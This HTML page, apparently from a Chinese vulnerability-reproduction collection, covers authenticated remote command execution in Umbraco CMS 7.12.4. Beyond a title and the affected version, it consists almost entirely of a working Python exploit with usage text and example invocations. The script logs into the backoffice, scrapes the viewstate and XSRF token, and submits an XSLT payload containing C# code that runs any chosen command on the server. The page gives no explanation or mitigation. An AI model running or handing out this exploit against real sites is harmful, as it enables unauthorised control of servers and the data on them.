<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="umbraco-cms-7124-后台远程命令执行漏洞"><span class="csDE05BCC">Umbraco CMS 7.12.4 </span><span class="csECDA2D3">后台远程命令执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Umbraco CMS 7.12.4</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="usage"><span class="csD1E291E2">Usage</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">$ python exploit.py -h</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">usage: exploit.py [-h] -u USER -p PASS -i URL -c CMD [-a ARGS]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">Umbraco authenticated RCE</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">optional arguments:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-h, --help &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;show this help message and exit</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-u USER, --user USER &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;username / email</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-p PASS, --password PASS &nbsp;&nbsp;password</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-i URL, --host URL &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root URL</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-c CMD, --command CMD &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;command</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-a ARGS, --arguments ARGS &nbsp;arguments</span></p><h3 class="cs868C439D">
			<a name="examples"><span class="csD1E291E2">Examples:</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">$ python exploit.py -u admin@example.org -p password123 -i &#39;http://10.0.0.1&#39; -c ipconfig</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$ python exploit.py -u admin@example.org -p password123 -i &#39;http://10.0.0.1&#39; -c powershell.exe -a &#39;-NoProfile -Command ls&#39;</span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234"># Exploit Title: Umbraco CMS - Authenticated Remote Code Execution </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Date: 2020-03-28</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Exploit Author: Alexandre ZANNI (noraj)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Based on: https://www.exploit-db.com/exploits/46153</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Vendor Homepage: http://www.umbraco.com/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Software Link: https://our.umbraco.com/download/releases</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Version: 7.12.4</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Category: Webapps</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Tested on: Windows IIS</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Example: python exploit.py -u admin@example.org -p password123 -i &#39;http://10.0.0.1&#39; -c ipconfig</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import re</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import argparse</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">from bs4 import BeautifulSoup</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">parser = argparse.ArgumentParser(prog=&#39;exploit.py&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;description=&#39;Umbraco authenticated RCE&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=80))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">parser.add_argument(&#39;-u&#39;, &#39;--user&#39;, metavar=&#39;USER&#39;, type=str,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;required=True, dest=&#39;user&#39;, help=&#39;username / email&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">parser.add_argument(&#39;-p&#39;, &#39;--password&#39;, metavar=&#39;PASS&#39;, type=str,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;required=True, dest=&#39;password&#39;, help=&#39;password&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">parser.add_argument(&#39;-i&#39;, &#39;--host&#39;, metavar=&#39;URL&#39;, type=str, required=True,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;dest=&#39;url&#39;, help=&#39;root URL&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">parser.add_argument(&#39;-c&#39;, &#39;--command&#39;, metavar=&#39;CMD&#39;, type=str, required=True,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;dest=&#39;command&#39;, help=&#39;command&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">parser.add_argument(&#39;-a&#39;, &#39;--arguments&#39;, metavar=&#39;ARGS&#39;, type=str, required=False,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;dest=&#39;arguments&#39;, help=&#39;arguments&#39;, default=&#39;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">args = parser.parse_args()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Payload</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload = &quot;&quot;&quot;\</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; xmlns:csharp_user=&quot;http://csharp.mycompany.com/mynamespace&quot;&gt;&lt;msxsl:script language=&quot;C#&quot; implements-prefix=&quot;csharp_user&quot;&gt;public string xml() { string cmd = &quot;%s&quot;; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = &quot;%s&quot;; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; &nbsp;proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } &nbsp;&lt;/msxsl:script&gt;&lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;csharp_user:xml()&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt;\</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&quot;&quot;&quot; % (args.arguments, args.command)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">login = args.user</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">password = args.password</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">host = args.url</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Process Login</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">url_login = host + &quot;/umbraco/backoffice/UmbracoApi/Authentication/PostLogin&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">loginfo = { &quot;username&quot;: login, &quot;password&quot;: password}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">s = requests.session()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r2 = s.post(url_login,json=loginfo)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Go to vulnerable web page</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">url_xslt = host + &quot;/umbraco/developer/Xslt/xsltVisualize.aspx&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r3 = s.get(url_xslt)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">soup = BeautifulSoup(r3.text, &#39;html.parser&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">VIEWSTATE = soup.find(id=&quot;__VIEWSTATE&quot;)[&#39;value&#39;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">VIEWSTATEGENERATOR = soup.find(id=&quot;__VIEWSTATEGENERATOR&quot;)[&#39;value&#39;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">UMBXSRFTOKEN = s.cookies[&#39;UMB-XSRF-TOKEN&#39;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers = {&#39;UMB-XSRF-TOKEN&#39;: UMBXSRFTOKEN}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">data = { &quot;__EVENTTARGET&quot;: &quot;&quot;, &quot;__EVENTARGUMENT&quot;: &quot;&quot;, &quot;__VIEWSTATE&quot;: VIEWSTATE,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;__VIEWSTATEGENERATOR&quot;: VIEWSTATEGENERATOR,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;ctl00$body$xsltSelection&quot;: payload,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;ctl00$body$contentPicker$ContentIdValue&quot;: &quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;ctl00$body$visualizeDo&quot;: &quot;Visualize+XSLT&quot; }</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Launch the attack</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r4 = s.post(url_xslt, data=data, headers=headers)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Filter output</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">soup = BeautifulSoup(r4.text, &#39;html.parser&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">CMDOUTPUT = soup.find(id=&quot;result&quot;).getText()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(CMDOUTPUT)</span></p></body>
</html>
